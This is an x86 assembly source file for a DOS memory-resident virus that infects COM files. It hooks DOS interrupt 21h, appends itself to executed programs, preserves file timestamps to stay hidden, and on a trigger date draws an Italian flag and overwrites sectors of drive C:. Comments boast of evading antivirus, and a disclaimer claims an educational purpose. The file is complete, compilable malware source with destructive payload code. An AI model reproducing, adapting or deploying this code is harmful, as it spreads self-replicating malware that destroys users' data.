; The author isn't responsible for the unlawful use of this virus
; This program was written for educational purpose ONLY
; This virus is very FUNNY because it was written in 1 day of EASY work.
; Compile with Macro Assembler Version 6.0 : "ML /AT IBOY.ASM"

          .MODEL TINY
          .CODE
          Org 100h

Start:    call       VStart                ;Here , the virus call itself

VStart    PROC       NEAR

          pop        si                    ;save into si the start offset
          sub        si,03                 ;sub 03 from si
          mov        ax,0f201h             ;check for presence of virus...
          int        21h                   ;in memory.Using ax=F201h/Int21h
          cmp        ax,01f2h              ;Is already installed?
          je         RestoreCOM            ;YES>Continue with program
TSRSet:   push       bx                    ;NO >Start with virus startup code
          push       es                    ;pushing many registers
          push       di                    ;     "           "
          push       si                    ;     "           "
          mov        bx,es                 ;moving extra segment into bx
          dec        bx                    ;moving to MCB location
          mov        ds,bx                 ;ds = MCB Location
          xor        di,di                 ;di=0,this is the pointer into MCB
          mov        ax,WORD PTR ds:[di+3] ;moving into ax the available mem
          sub        ax,38h                ;substracting 38*16k
          mov        WORD PTR ds:[di+03h],ax;replacing NEW memory
          sub        WORD PTR ds:[di+12h],38h;replacing available memory
          inc        bx                    ;bx=bx+1
          add        ax,bx                 ;NEW High Preserved Memory Segment
          mov        es,ax                 ;moving Preserved Seg into es
          push       cs                    ;assuming cs=ds...
          pop        ds                    ;to work with properly DS segment
          mov        cx,0578               ;moving the virus in the new area
          rep        movsb                 ;GO!..F-Prot detect this code!!!
          pop        si                    ;It Says"This Program move itself
          pop        di                    ;into memory in a very strange way"
          pop        es                    ;popping many registers...
          pop        bx
          sub        ax,10h                ;starting offset 0100h into new seg
          push       ax                    ;saving ax into stack....
          mov        ax,OFFSET TSRBody     ;saving tsr startup into stack...
          push       ax                    ;...to the unlawful(fuck to F-prot)
          retf                             ;jump into new segment!
TSRBody:  push       ds                    ;HERE IS THE TSR MAIN BODY.
          push       es                    ;Popping many registers
          push       cs
          pop        ds
          mov        ax,3521h              ;call DOS to get the int21 seg:ofs
          int        21h                   ;Hey DOS!..are you here?
          mov        WORD PTR cs:OldInt21[0],bx;Saving seg:ofs of int21 ...
          mov        WORD PTR cs:OldInt21[2],es;...into OldInt21 Label
          mov        ax,2521h              ;setting new DOS int21 with Vir_21
          mov        dx,OFFSET Vir_21      ;using dos function .
          int        21h
          pop        es                    ;popping used registers
          pop        ds
RestoreCOM:add       si,01dch              ;HERE IS THE JUMP TO PROGRAM
          mov        di,0100h              ;pointing to old six instructions
          mov        cx,06                 ;moving the bytes with a rep movsb
          rep        movsb                 ;GO!!...
          push       es                    ;pushing old segment into stack
          mov        ax,0100h              ;start offset for COM program
          push       ax                    ;pushing it into stack...
          retf                             ;after this the virus pass control
                                           ;to main program.(See OldSix Label)
VStart    ENDP                             ;STARTUP CODE ENDS HERE.

;Vir_21   Handler for DOS int 21h Interrupt
;This handler is the main body of the virus.Infact it provides to many
;life functions ,like memory checks.
;
;This handler has two main functions:
;
; 1] Check for memory management
; When a program attempt a AX=f201h/Int21h it return with a 01F2h into ax.
; This function is used to check the virus presence in memory (see before)
;
; 2] When a program is executed ,the handler infect the files .
; When user attempt a ax=4b00h/Int21h this handler provide to infect the
; program to be executed.First of all,it check for the COM files,then it
; see for the "Already Infected Flag".If the checks are negative ,it
; infect COM files .

Vir_21    PROC       NEAR                  ;HERE IS THE INT21H HANDLERS

          cmp        ax,0f201h             ;A program attempt to a memory...
          jne        Do4b                  ;check?..
          xchg       ah,al                 ;YES> eXCHGange ax and ...
          iret                             ;return to calling program
Do4b:     cmp        ax,4b00h              ;NO>Do 4b00h check...
          jne        Do_Old21              ;If not then jump to old int21
          pushf                            ;YES>>IS TIME TO INFECT FILE!!
          push       ax                    ;Pushing flag...
          push       bx                    ;and many others registers.
          push       cx
          push       dx
          push       ds
          push       es
          push       di
          push       si
          push       bp
          call       Check
          mov        ax,3d02h              ;ds:dx ASCIIZ filename.Oper with DOS
          int        21h                   ;call "DOS Open File" Service
          push       cs                    ;assuming cs=ds
          pop        ds
          mov        bp,ax                 ;moving file's handle into bp
; 1 Check : Now the handler check for a valid COM files
; It read the first two bytes of the target file;if the two bytes are
; equal to 5A4DH (MZ .. EXE Signature) it pass control to old  Int21h
          mov        ah,3fh                ;read from file service
          mov        bx,bp                 ;bx=file handle
          mov        cx,02                 ;read the first two bytes of the file
          mov        dx,OFFSET EXEFirm     ;offset of the storage buffer
          int        21h                   ;calling DOS...
          cmp        EXEFirm,5a4dh         ;check is these two bytes are 'MZ'
          je         DoNothing             ;YES?!? Jump to old Int21h
; 2 Check : There is the handler's part when the virus check for it in
; the target file.If the virus recognize an infection it pass control to
; old int 21h.
          mov        ax,4200h              ;NO?!? check for infection
          mov        bx,bp                 ;moving bx=handler's file
          xor        cx,cx                 ;moving file pointer to ...
          xor        dx,dx                 ;end of file - 2.
          int        21h                   ;calling DOS function
          mov        ah,3fh                ;read the final two bytes
          mov        bx,bp                 ;moving file's hanlde into bx
          mov        dx,OFFSET VBFiRM      ;offset of the signature's buffer
          mov        cx,01                 ;read two bytes
          int        21h                   ;call dos service
          mov        ah,0eh                ;moving into ax the virus firm
          cmp        ah,VBFiRM             ;compare the two bytes with firm
          je         DoNothing             ;File already infected??yes go away
          mov        ax,5700h              ;read date/time of the target file
          mov        bx,bp                 ;moving file's handler into bx
          int        21h                   ;call DOS service
          push       cx                    ;saving date/time into stack
          push       dx
          mov        ax,4200h              ;moving file pointer to start point
          mov        bx,bp                 ;bx=file's handler
          xor        cx,cx                 ;start of the target file
          xor        dx,dx
          int        21h                   ;calling DOS service
          mov        ah,3fh                ;read the first six bytes...
          mov        cx,06                 ;...to save them in a buffer
          mov        bx,bp                 ;bx=file's hanlde
          mov        dx,OFFSET OldSix      ;offet of buffer
          int        21h                   ;calling dos service
          mov        ax,4202h              ;moving file's pointer to the...
          xor        cx,cx                 ;...end of target file
          xor        dx,dx
          mov        bx,bp                 ;bx=file's handle
          int        21h                   ;calling dos service
          add        ax,0100h              ;ax=file length...adding 0100h...
          mov        BYTE PTR NewSix[3],ah ;...and saving jump ofs into the...
          mov        BYTE PTR NewSix[2],al ;...new entry point buffer
          mov        ah,40h                ;write on the target file
          mov        bx,bp                 ;bx=file's handle
          mov        cx,578                ;appending virus to end of file
          mov        dx,0100h              ;start offset of write's buffer
          int        21h                   ;calling dos service
          mov        ax,4200h              ;move file pointer
          mov        bx,bp                 ;bx=file's handle
          xor        cx,cx                 ;Now,I will save the NEW entry
          xor        dx,dx                 ;point at the first six bytes of file
          int        21h                   ;calling dos service
          mov        ah,40h                ;write new entry point
          mov        bx,bp
          mov        dx,OFFSET NewSix      ;offset of new entry point
          mov        cx,06                 ;write new six bytes
          int        21h                   ;calling dos service
          mov        ax,5701h              ;restore old file's date/time
          pop        dx                    ;popping them from stack
          pop        cx
          mov        bx,bp
          int        21h                   ;calling dos service
          inc        WORD PTR cs:Hits      ;inc the file's "Hits"!...
DoNothing:mov        ah,3eh                ;close target file
          mov        bx,bp                 ;bx=file's handle
          int        21h                   ;calling dos service
          pop        bp                    ;popping from stack the used regs
          pop        si
          pop        di
          pop        es
          pop        ds
          pop        dx
          pop        cx
          pop        bx
          pop        ax
          popf                             ;popping flags
Do_Old21: jmp        cs:OldInt21           ;jump to old int 21h
          iret                             ;return from interrupt

Vir_21    ENDP                             ;INT 21H HANDLER ENDS HERE

; This procedure check for date and time of system.If the date is
; 03/04 the virus trash the Hard Disk and write out some messages...

Check     PROC       NEAR

          push       ax
          push       dx
          push       cx
          mov        ah,2ah                ;read system's date
          int        21h                   ;calling dos service
          cmp        dh,04                 ;the month is march?
          je         @1                    ;yes continue with check
          jmp        NoTime                ;no  isn't time to work(sigh!)
@1:       cmp        dl,03                 ;is the third day of march ?
          jae        JustDoIt              ;yes -->>> JUST DO IT!!!!!
NoTime:   pop        cx
          pop        dx
          pop        ax
          ret
JustDoIt: pop        cx
          pop        dx
          pop        ax
          call       Hi_Dude               ;hey Dude...Italian SchoolBoy...
                                           ;...is here!!
Check     ENDP

;This procedure provide to trash the Hard Disk and to write out some texts

Hi_Dude   PROC       NEAR

;This is the part of virus provide to draw an Italian Flag on the screen

Italy:    xor        dx,dx                 ;xoring dx
          mov        cx,25                 ;draw flag on the screen
Main:     push       cx                    ;pushing cx
          mov        cx,25                 ;first green-band
Color1:   mov        bl,22h                ;text color
          call       PutXY                 ;call bios service
          inc        dl                    ;inc x
          loop       Color1                ;looping with color1
          mov        cx,25                 ;now,I draw the second white-band
Color2:   mov        bl,77h                ;color's attribute
          call       PutXY                 ;call bios
          inc        dl                    ;inc x
          loop       color2                ;loop with color2
          mov        cx,27                 ;this is the red-band
Color3:   mov        bl,44h                ;red's attribute
          call       PutXY                 ;call bios
          inc        dl                    ;inc x
          loop       Color3                ;looping with color3
          pop        cx                    ;popping cx from stack
          inc        dh                    ;inc y
          xor        dl,dl                 ;xoring x
          loop       Main                  ;main loop...
          mov        ah,13h                ;write out some text
          mov        dh,10                 ;x and...
          mov        dl,15                 ;... y coordinates
          mov        bp,OFFSET Text1       ;offset of msg into bp
          mov        cx,LENGTHOF Text1     ;cx length of msg
          mov        bl,0eh                ;text's color
          xor        bh,bh
          int        10h                   ;call bios
Trash_HD: mov        al,02                 ;drive C:
          mov        cx,30                 ;write on 30 sectors
          xor        dx,dx                 ;firts logic sector
          int        26h                   ;int 26...the MicroSoft Killer Int
Meditation:jmp       Meditation            ;Meditation...think about your HD!

Hi_Dude   ENDP

PutXY     PROC       NEAR

          push       ax
          push       bx
          push       cx
          push       dx
          mov        ah,13h
          mov        bh,00
          mov        cx,01
          push       cs
          push       cs
          pop        es
          pop        ds
          mov        bp,OFFSET Char
          int        10h
          pop        dx
          pop        cx
          pop        bx
          pop        ax
          ret

PutXY     ENDP

.DATA

; This is the data area of virus;It contains many importants informations
; like old entry point . It ,also, contains some texts...
; PLEASE DON'T BE A LAMER.DON'T CHANGE THE STRINGS!!!!

OldInt21  DWORD      ?
OldSix    BYTE       0cdh,20h,00,00,00,00
NewSix    BYTE       0eh,0b8h,00,00,50h,0cbh
EXEFirm   WORD       ?
Text1     BYTE       '� ITALY  IS  THE  BEST  COUNTRY  IN  THE  WORLD �'
Text2     BYTE       'Fucks to Italian Virus Killers'
Hits      WORD       0000
VBFiRM    BYTE       ?
FiRM      BYTE       0eh
Char      BYTE       '�'

.CODE

          END        Start
